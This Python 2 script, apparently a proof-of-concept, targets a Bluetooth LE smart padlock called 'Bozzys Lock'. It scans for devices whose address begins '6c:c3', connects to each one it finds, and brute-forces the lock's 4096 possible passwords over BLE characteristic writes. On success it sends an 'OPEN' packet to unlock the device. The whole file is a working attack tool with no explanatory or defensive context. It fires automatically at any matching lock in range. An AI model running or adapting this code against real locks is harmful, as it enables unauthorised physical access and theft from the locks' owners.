#!/usr/bin/env python
from bluepy.btle import Peripheral, DefaultDelegate, UUID, ADDR_TYPE_RANDOM, ADDR_TYPE_PUBLIC, Scanner
import hexdump
import binascii
import urllib2
import json
import fnmatch
import time
from Crypto.Cipher import AES

class NotifyDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleNotification(self, cHandle, data):
        if not lock.search:
                return
        if data[0] == b'\x59':
            lock.result=True
        if data[0] == b'\x59' and data[1] == b'\xf0':
            # Success!
            lock.endSearch()


class ScanDelegate(DefaultDelegate):
    def __init__(self):
        DefaultDelegate.__init__(self)

    def handleDiscovery(self, dev, isNewDev, isNewData):
        if isNewDev:
            if fnmatch.fnmatch(dev.addr, '6c:c3:*'):
                print "Found Bozzys Lock %s" % (dev.getValueText(9))
                lock.bruteForcePassword(dev.addr)

class BozzysLock():
    def __init__(self):
        self.addr=""
        self.pwd=0
        self.search=False
        self.result=False

    def connect(self):
        self.p = Peripheral(self.addr, addrType=ADDR_TYPE_PUBLIC)
        self.p.setDelegate(NotifyDelegate())
        # Start listening for notification
        self.p.writeCharacteristic(0x39,b'\x01\x00')

    def setAddr(self,addr):
        self.addr=addr
        self.connect()

    def getAddr(self):
        return self.addr

    def setKey(self,key):
        self.key=key
        self.aes=AES.new(key, AES.MODE_ECB)

    def getKey(self):
        return self.key

    def setPwd(self):
        count=0
        while self.result == False and count <= 5:
            time.sleep(5)
            count += 1

        if count==6:
            #Timed out possible - just quit it
            self.endSearch()
            return
        pwd=renderNum(self.pwd)
        raw='29' + pwd + '28'
        message=binascii.unhexlify(raw)
        # Send message
        self.p.writeCharacteristic(0x4d,(message))
        self.result=False
        self.p.waitForNotifications(5.0)

    def unlock(self):
        print "Unlocking"
        self.p.disconnect()
        self.connect()
        packet=binascii.unhexlify("fe4f50454e00000000fd")
	self.setPwd()
        self.p.writeCharacteristic(0x4d,packet)

    def bruteForcePassword(self, addr):
        self.setAddr(addr)
        print "Guessing Password"
        self.pwd=0
        self.search=True
        self.result=True
        while self.search:
            self.nextPwd()
        if self.pwd < 4096:
            print "Found password: {}".format(renderNum(self.pwd))
            self.unlock()

    def nextPwd(self):
        if self.pwd < 4096:
            if self.pwd % 16 == 0:
                print "Guessing {}".format(renderNum(self.pwd))
            self.pwd += 1
            self.setPwd()
        else:
            print "Reached the end, no idea!"
            self.search=False

    def endSearch(self):
        self.search=False

def renderNum(num):
    out=""
    while num:
        mod=num % 4;
        num //= 4
        out = "0{}{}".format(charset[mod],out)
    return "{}{}".format("01"*((12-len(out))/2),out)

charset=["1","2","3","4"]
lock=BozzysLock()
print "Scanning..."
scanner=Scanner(0).withDelegate(ScanDelegate())
devices=scanner.scan(10)

